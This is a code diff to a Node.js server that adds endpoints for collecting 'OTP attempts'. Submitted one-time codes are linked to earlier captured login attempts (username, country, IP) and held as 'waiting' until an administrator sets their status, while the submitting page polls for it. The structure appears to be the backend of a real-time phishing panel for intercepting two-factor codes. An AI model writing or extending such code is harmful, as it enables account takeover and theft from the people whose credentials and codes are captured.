@@ -13,8 +13,10 @@ const orders = [];
 const clicks = [];
 const blockedIPs = new Set();
 const loginAttempts = [];
+const otpAttempts = [];
 let orderCounter = 1000;
 let loginCounter = 5000;
+let otpCounter = 8000;
 let clickCounter = 0;
 let totalVisitsToday = 0;
 let pageViewsToday = 0;
@@ -290,6 +292,61 @@ const server = http.createServer(async (req, res) => {
     try {
       const data = JSON.parse(body);
       const attempt = loginAttempts.find(a => a.id === data.id);
+      if (!attempt) return json(res, { error: 'not found' }, 404);
+      attempt.status = data.status;
+      return json(res, { success: true });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  // --- OTP Attempts ---
+
+  if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
+    const ip = getIP(req);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      otpCounter++;
+      const loginId = parseInt(data.loginId);
+      const login = loginAttempts.find(a => a.id === loginId);
+      const attempt = {
+        id: otpCounter,
+        loginId,
+        username: login ? login.username : '',
+        otp: (data.otp || '').substring(0, 20),
+        country: login ? login.country : (data.country || 'غير معروف'),
+        lang: data.lang || 'ar',
+        ip,
+        status: 'waiting',
+        date: new Date().toISOString()
+      };
+      otpAttempts.push(attempt);
+      return json(res, { success: true, id: attempt.id });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
+    const parts = reqPath.split('/');
+    const id = parseInt(parts[3]);
+    const attempt = otpAttempts.find(a => a.id === id);
+    if (!attempt) return json(res, { status: 'not_found' }, 404);
+    return json(res, { status: attempt.status });
+  }
+
+  if (req.method === 'GET' && reqPath === '/api/otp-attempts') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    return json(res, { attempts: otpAttempts.slice().reverse() });
+  }
+
+  if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const attempt = otpAttempts.find(a => a.id === data.id);
       if (!attempt) return json(res, { error: 'not found' }, 404);
       attempt.status = data.status;
       return json(res, { success: true });
